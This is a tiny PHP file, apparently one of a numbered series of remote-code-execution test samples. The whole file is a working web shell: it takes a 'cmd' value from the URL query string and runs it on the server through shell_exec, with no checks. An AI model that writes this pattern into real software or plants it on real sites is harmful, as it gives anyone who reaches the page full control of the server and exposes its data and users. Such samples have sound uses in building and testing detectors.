<?php
// RCE test variation #956
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>